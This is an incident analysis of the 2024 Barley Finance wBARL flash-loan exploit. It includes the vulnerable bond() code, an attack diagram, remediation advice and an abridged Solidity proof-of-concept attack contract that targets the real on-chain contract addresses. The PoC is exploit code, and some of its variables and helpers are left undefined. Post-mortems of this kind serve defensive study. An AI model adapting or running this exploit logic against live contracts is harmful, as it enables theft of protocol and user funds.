# BarleyFinance — Flash Loan-Based Bond/Debond Mechanism Exploitation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-22 |
| **Protocol** | Barley Finance (wBARL) |
| **Chain** | Ethereum |
| **Loss** | ~$130,000 |
| **Attacker** | [0x7b3a6eff](https://etherscan.io/address/0x7b3a6eff1c9925e509c2b01a389238c1fcc462b6) |
| **Attack Contract** | [0x356e7481](https://etherscan.io/address/0x356e7481b957be0165d6751a49b4b7194aef18d5) |
| **Vulnerable Contract** | [wBARL 0x04c80bb4](https://etherscan.io/address/0x04c80bb477890f3021f03b068238836ee20aa0b8) |
| **Root Cause** | The `bond()` function mints wBARL based on the balance at the time of the call, with no reentrancy guard inside the callback, allowing excessive wBARL acquisition through temporary large holdings |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/BarleyFinance_exp.sol) |

---

## 1. Vulnerability Overview

The wBARL wrapper contract of Barley Finance exposed a `flash()` function that allowed BARL tokens to be borrowed via flash loan. Using only 200 DAI, the attacker executed a 20-iteration loop, calling `wBARL.flash()` each time to borrow the entire BARL balance, then accumulating wBARL via `bond()` inside the callback. After the loop, the attacker called `debond()` to redeem the full amount, securing approximately $130,000 in profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: insufficient balance validation when bond() is called inside flash() callback
interface IwBARL {
    function flash(address recipient, address token, uint256 amount, bytes calldata data) external;
    function bond(address token, uint256 amount) external;
    function debond(uint256 amount, address[] memory tokens, uint8[] memory percents) external;
    function callback(bytes calldata data) external;
}

// bond() is permitted inside flash() without a balance snapshot
// Repeated calls cause wBARL balance to accumulate

// ✅ Safe code: block bond/debond during an active flash loan
modifier noFlashLoanReentrancy() {
    require(!_flashLoanActive, "flash loan active");
    _;
}

function bond(address token, uint256 amount) external noFlashLoanReentrancy {
    // bond logic
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: WeightedIndex.sol
  function bond(address _token, uint256 _amount) external override noSwap {  // ❌ Vulnerability
    require(_isTokenInIndex[_token], 'INVALIDTOKEN');
    uint256 _tokenIdx = _fundTokenIdx[_token];
    uint256 _tokensMinted = (_amount * FixedPoint96.Q96 * 10 ** decimals()) /
      indexTokens[_tokenIdx].q1;
    uint256 _feeTokens = _isFirstIn() ? 0 : (_tokensMinted * BOND_FEE) / 10000;
    _mint(_msgSender(), _tokensMinted - _feeTokens);
    if (_feeTokens > 0) {
      _mint(address(this), _feeTokens);
    }
    for (uint256 _i; _i < indexTokens.length; _i++) {
      uint256 _transferAmount = _i == _tokenIdx
        ? _amount
        : (_amount *
          indexTokens[_i].weighting *
          10 ** IERC20Metadata(indexTokens[_i].token).decimals()) /
          indexTokens[_tokenIdx].weighting /
          10 ** IERC20Metadata(_token).decimals();
      _transferAndValidate(
        IERC20(indexTokens[_i].token),
        _msgSender(),
        _transferAmount
      );
    }
    emit Bond(_msgSender(), _token, _amount, _tokensMinted);
  }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Prepare 200 DAI
  │
  ├─→ [2] Loop 20 times:
  │       ├─→ approve 10 DAI → wBARL.flash(entire BARL balance)
  │       └─→ callback(): bond(BARL) → accumulate wBARL
  │
  ├─→ [3] debond(accumulated wBARL, 100%) → redeem large amount of BARL
  │
  ├─→ [4] BARL → DAI → WETH (Uniswap V3 exactInput)
  │
  └─→ [5] Profit secured (~$130K)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IwBARL {
    function flash(address recipient, address token, uint256 amount, bytes calldata data) external;
    function bond(address token, uint256 amount) external;
    function debond(uint256 amount, address[] memory tokens, uint8[] memory percents) external;
    function callback(bytes calldata data) external;
}

contract AttackContract {
    IwBARL constant wBARL = IwBARL(0x04c80bb477890f3021f03b068238836ee20aa0b8);
    IERC20 constant BARL  = IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);
    IERC20 constant DAI   = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function testExploit() external {
        // [1] Acquire 200 DAI, then flash loan 20 times in a loop
        for (uint i = 0; i < 20; i++) {
            DAI.approve(address(wBARL), 10 ether);
            // Request flash loan for the entire BARL balance
            wBARL.flash(address(this), address(BARL), BARL.balanceOf(address(wBARL)), "");
        }

        // [2] Debond the full accumulated wBARL balance
        address[] memory tokens = new address[](1);
        tokens[0] = address(BARL);
        uint8[] memory percents = new uint8[](1);
        percents[0] = 100;
        wBARL.debond(wBARL_balance, tokens, percents);

        // [3] Swap BARL → WETH (Uniswap V3 exactInput)
        BARLToWETH();
    }

    // wBARL flash loan callback — bond the entire borrowed BARL amount
    function callback(bytes calldata) external {
        BARL.approve(address(wBARL), type(uint256).max);
        wBARL.bond(address(BARL), BARL.balanceOf(address(this)));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash Loan-Based Repeated Bonding (Flash Loan + Bond Accumulation) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (repeated flash loan calls) |
| **DApp Category** | Wrapped Token / Liquidity Pool |
| **Impact** | Protocol fund theft |

## 6. Remediation Recommendations

1. **Block flash loan reentrancy**: Use a `_flashLoanActive` flag to prevent `bond()`/`debond()` calls while `flash()` is executing
2. **Restrict state changes in callbacks**: Apply a whitelist of functions permitted to execute inside flash loan callbacks
3. **Balance snapshot validation**: Compare the balance before and after `flash()` calls to detect abnormal accumulation
4. **Limit repeated calls**: Restrict the number of `flash()` calls per account within a single block

## 7. Lessons Learned

- Logic that allows tokens to be bonded (deposited) into a protocol within a flash loan callback can result in state accumulating in unexpected ways across repeated calls.
- Even starting with a small amount (200 DAI), be wary of leverage patterns where a loop can generate large-scale profit.
- Contracts that expose flash loan functionality must strictly restrict which functions are permitted inside the callback.